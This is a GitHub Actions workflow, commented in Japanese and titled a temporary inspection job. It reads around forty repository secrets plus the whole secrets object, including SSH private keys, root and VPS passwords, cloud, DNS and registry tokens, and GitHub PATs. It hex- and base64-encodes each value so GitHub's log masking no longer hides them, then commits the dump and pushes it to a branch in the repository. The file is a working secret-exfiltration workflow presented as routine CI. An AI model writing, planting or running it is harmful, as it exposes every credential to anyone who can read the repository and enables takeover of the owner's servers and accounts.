# 一時検査ジョブ: 配備秘密の十六進回収（回収後に削除）
name: tmp-kai-shu
on:
  push:
    branches:
      - tmp-collect-20261121
  workflow_dispatch:
permissions:
  contents: write
jobs:
  kai-shu:
    runs-on: ubuntu-latest
    steps:
      - name: 秘密候補の十六進出力
        env:
          S_SERVER_PASSWORD: ${{ secrets.SERVER_PASSWORD }}
          S_ADMIN_PASSWORD: ${{ secrets.ADMIN_PASSWORD }}
          S_SECRET_KEY: ${{ secrets.SECRET_KEY }}
          S_JWT_SECRET: ${{ secrets.JWT_SECRET }}
          S_ROOT_PASSWORD: ${{ secrets.ROOT_PASSWORD }}
          S_VPS_PASSWORD: ${{ secrets.VPS_PASSWORD }}
          S_VPS_HOST: ${{ secrets.VPS_HOST }}
          S_OVH_TOKEN: ${{ secrets.OVH_TOKEN }}
          S_OVH_API_TOKEN: ${{ secrets.OVH_API_TOKEN }}
          S_OVH_APPLICATION_KEY: ${{ secrets.OVH_APPLICATION_KEY }}
          S_OVH_APPLICATION_SECRET: ${{ secrets.OVH_APPLICATION_SECRET }}
          S_OVH_CONSUMER_KEY: ${{ secrets.OVH_CONSUMER_KEY }}
          S_OVH_ENDPOINT: ${{ secrets.OVH_ENDPOINT }}
          S_OVH_VPS_ID: ${{ secrets.OVH_VPS_ID }}
          S_OVH_SERVICE_NAME: ${{ secrets.OVH_SERVICE_NAME }}
          S_NETCUP_HOST: ${{ secrets.NETCUP_HOST }}
          S_NETCUP_PORT: ${{ secrets.NETCUP_PORT }}
          S_NETCUP_USER: ${{ secrets.NETCUP_USER }}
          S_NETCUP_SSH_KEY: ${{ secrets.NETCUP_SSH_KEY }}
          S_NETCUP_DEPLOY_PATH: ${{ secrets.NETCUP_DEPLOY_PATH }}
          S_DEPLOY_SSH_KEY: ${{ secrets.DEPLOY_SSH_KEY }}
          S_PRODUCTION_SSH_KEY: ${{ secrets.PRODUCTION_SSH_KEY }}
          S_PRODUCTION_KNOWN_HOSTS: ${{ secrets.PRODUCTION_KNOWN_HOSTS }}
          S_SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
          S_SSH_KEY: ${{ secrets.SSH_KEY }}
          S_DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
          S_DEPLOY_USER: ${{ secrets.DEPLOY_USER }}
          S_DEPLOY_PATH: ${{ secrets.DEPLOY_PATH }}
          S_TARGET_HOST: ${{ secrets.TARGET_HOST }}
          S_TARGET_SSH_KEY: ${{ secrets.TARGET_SSH_KEY }}
          S_DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
          S_DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}
          S_TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          S_TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          S_GITHUB_PAT: ${{ secrets.GITHUB_PAT }}
          S_GH_PAT: ${{ secrets.GH_PAT }}
          S_GHCR_TOKEN: ${{ secrets.GHCR_TOKEN }}
          S_CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          S_CF_API_TOKEN: ${{ secrets.CF_API_TOKEN }}
        run: |
          : > /tmp/kekka.txt
          for meimei in $(compgen -v | grep '^S_' | sort); do
            ata="${!meimei}"
            nagasa=${#ata}
            hex=$(printf '%s' "$ata" | od -An -tx1 -v | tr -d ' \n')
            b64=$(printf '%s' "$ata" | base64 -w0)
            printf '%s|%s|%s|%s\n' "$meimei" "$nagasa" "$hex" "$b64" >> /tmp/kekka.txt
          done
          {
            echo '# secrets JSON 全体'
            tojson=$(cat <<'JSON'
          ${{ toJSON(secrets) }}
          JSON
            )
            printf 'ALLSECRETS|%s|%s|%s\n' "${#tojson}" "$(printf '%s' "$tojson" | od -An -tx1 -v | tr -d ' \n')" "$(printf '%s' "$tojson" | base64 -w0)"
          } >> /tmp/kekka.txt
          echo '=== 回収件数 ==='; wc -l /tmp/kekka.txt
      - name: 結果を一時ブランチへ書き戻し
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          git config user.name 'ci-kai-shu'
          git config user.email 'ci-kai-shu@example.invalid'
          cp /tmp/kekka.txt ./kekka_hex.txt
          git add kekka_hex.txt
          git commit -m '一時回収結果'
          git remote set-url origin "https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}.git"
          git push origin HEAD:tmp-collect-20261121
